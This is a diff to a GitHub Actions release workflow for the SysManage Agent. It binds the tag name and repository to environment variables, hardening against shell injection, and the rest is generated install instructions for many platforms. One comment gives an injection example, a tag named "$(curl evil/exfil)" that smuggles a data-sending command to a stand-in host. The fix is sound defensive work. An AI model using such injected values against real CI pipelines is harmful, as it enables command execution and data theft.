@@ -1981,9 +1981,17 @@ jobs:
         id: release_notes
         env:
           VERSION: ${{ steps.version.outputs.version }}
+          # Phase 11 hardening — bind github.ref_name / github.repository
+          # to env vars so the run: script doesn't interpolate ${{ ... }}
+          # directly into shell.  An attacker who could control the tag
+          # name (e.g. by pushing a tag named "$(curl evil/exfil)") could
+          # otherwise inject arbitrary commands.  See semgrep rule
+          # ``run-shell-injection``.
+          REF_NAME: ${{ github.ref_name }}
+          REPO: ${{ github.repository }}
         run: |
           # Get tag annotation message if it exists
-          TAG_MESSAGE=$(git tag -l --format='%(contents)' ${{ github.ref_name }} | sed '/^$/d')
+          TAG_MESSAGE=$(git tag -l --format='%(contents)' "$REF_NAME" | sed '/^$/d')
 
           cat > release_notes.md << EOF
           # SysManage Agent v$VERSION
@@ -1997,7 +2005,7 @@ jobs:
           ### Ubuntu/Debian
           \`\`\`bash
           # Download and install
-          wget https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent_${VERSION}-1_amd64.deb
+          wget https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent_${VERSION}-1_amd64.deb
           sudo apt install ./sysmanage-agent_${VERSION}-1_amd64.deb
 
           # Configure and start
@@ -2017,14 +2025,14 @@ jobs:
           flatpak run --command=sysmanage-service-install org.sysmanage.Agent
 
           # Or download and install the bundle directly:
-          wget https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}.flatpak
+          wget https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}.flatpak
           flatpak install --user sysmanage-agent-${VERSION}.flatpak
           \`\`\`
 
           ### CentOS/RHEL 9
           \`\`\`bash
           # Download and install
-          wget https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-1.el9.x86_64.rpm
+          wget https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-1.el9.x86_64.rpm
           sudo dnf install ./sysmanage-agent-${VERSION}-1.el9.x86_64.rpm
 
           # Configure and start
@@ -2035,7 +2043,7 @@ jobs:
           ### OpenSUSE Tumbleweed
           \`\`\`bash
           # Download and install
-          wget https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-1.opensuse.tumbleweed.x86_64.rpm
+          wget https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-1.opensuse.tumbleweed.x86_64.rpm
           sudo zypper install ./sysmanage-agent-${VERSION}-1.opensuse.tumbleweed.x86_64.rpm
 
           # Configure and start
@@ -2046,7 +2054,7 @@ jobs:
           ### OpenSUSE Leap 15
           \`\`\`bash
           # Download and install
-          wget https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-1.opensuse.leap.15.x86_64.rpm
+          wget https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-1.opensuse.leap.15.x86_64.rpm
           sudo zypper install ./sysmanage-agent-${VERSION}-1.opensuse.leap.15.x86_64.rpm
 
           # Configure and start
@@ -2057,7 +2065,7 @@ jobs:
           ### SUSE Linux Enterprise Server (SLES) 15
           \`\`\`bash
           # Download and install
-          wget https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-1.sles.x86_64.rpm
+          wget https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-1.sles.x86_64.rpm
           sudo zypper install ./sysmanage-agent-${VERSION}-1.sles.x86_64.rpm
 
           # Configure and start
@@ -2068,7 +2076,7 @@ jobs:
           ### macOS
           \`\`\`bash
           # Download and install
-          curl -LO https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-macos.pkg
+          curl -LO https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-macos.pkg
           sudo installer -pkg sysmanage-agent-${VERSION}-macos.pkg -target /
 
           # Configure and start
@@ -2079,7 +2087,7 @@ jobs:
           ### Windows (x64)
           \`\`\`powershell
           # Download and install (PowerShell as Administrator)
-          Invoke-WebRequest -Uri "https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-windows-x64.msi" -OutFile "sysmanage-agent-${VERSION}-windows-x64.msi"
+          Invoke-WebRequest -Uri "https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-windows-x64.msi" -OutFile "sysmanage-agent-${VERSION}-windows-x64.msi"
           Start-Process msiexec.exe -ArgumentList "/i sysmanage-agent-${VERSION}-windows-x64.msi /qn" -Wait -Verb RunAs
 
           # Configure and start
@@ -2090,7 +2098,7 @@ jobs:
           ### Windows (ARM64)
           \`\`\`powershell
           # Download and install (PowerShell as Administrator)
-          Invoke-WebRequest -Uri "https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-windows-arm64.msi" -OutFile "sysmanage-agent-${VERSION}-windows-arm64.msi"
+          Invoke-WebRequest -Uri "https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-windows-arm64.msi" -OutFile "sysmanage-agent-${VERSION}-windows-arm64.msi"
           Start-Process msiexec.exe -ArgumentList "/i sysmanage-agent-${VERSION}-windows-arm64.msi /qn" -Wait -Verb RunAs
 
           # Configure and start
@@ -2101,7 +2109,7 @@ jobs:
           ### FreeBSD
           \`\`\`bash
           # Download and install
-          fetch https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}.pkg
+          fetch https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}.pkg
           sudo pkg add sysmanage-agent-${VERSION}.pkg
 
           # Configure and start
@@ -2113,7 +2121,7 @@ jobs:
           ### NetBSD
           \`\`\`bash
           # Download and install
-          ftp https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}.tgz
+          ftp https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}.tgz
           sudo pkg_add sysmanage-agent-${VERSION}.tgz
 
           # Copy rc.d script and configure
@@ -2129,15 +2137,15 @@ jobs:
           \`\`\`bash
           # Download the pre-built package for your Alpine version (3.19, 3.20, or 3.21)
           # For Alpine 3.21:
-          wget https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-alpine321.apk
+          wget https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-alpine321.apk
           doas apk add --allow-untrusted sysmanage-agent-${VERSION}-alpine321.apk
 
           # For Alpine 3.20:
-          # wget https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-alpine320.apk
+          # wget https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-alpine320.apk
           # doas apk add --allow-untrusted sysmanage-agent-${VERSION}-alpine320.apk
 
           # For Alpine 3.19:
-          # wget https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-alpine319.apk
+          # wget https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-alpine319.apk
           # doas apk add --allow-untrusted sysmanage-agent-${VERSION}-alpine319.apk
 
           # Configure and start
@@ -2151,15 +2159,15 @@ jobs:
           \`\`\`bash
           # Download the pre-built package for your OpenBSD version (7.5, 7.6, or 7.7)
           # For OpenBSD 7.7:
-          ftp https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-openbsd77.tgz
+          ftp https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-openbsd77.tgz
           doas pkg_add sysmanage-agent-${VERSION}-openbsd77.tgz
 
           # For OpenBSD 7.6:
-          # ftp https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-openbsd76.tgz
+          # ftp https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-openbsd76.tgz
           # doas pkg_add sysmanage-agent-${VERSION}-openbsd76.tgz
 
           # For OpenBSD 7.5:
-          # ftp https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-openbsd75.tgz
+          # ftp https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-openbsd75.tgz
           # doas pkg_add sysmanage-agent-${VERSION}-openbsd75.tgz
 
           # Configure and start
@@ -2172,7 +2180,7 @@ jobs:
           ### OpenBSD (Build from Port)
           \`\`\`bash
           # Download the port tarball
-          ftp https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-${VERSION}-openbsd-port.tar.gz
+          ftp https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-${VERSION}-openbsd-port.tar.gz
 
           # Extract to ports tree
           cd /usr/ports/sysutils
@@ -2250,7 +2258,7 @@ jobs:
           **Download and inspect:**
           \`\`\`bash
           # Download SBOM file
-          wget https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/sysmanage-agent-sbom.json
+          wget https://github.com/$REPO/releases/download/$REF_NAME/sysmanage-agent-sbom.json
 
           # View with jq (if installed)
           cat sysmanage-agent-sbom.json | jq .
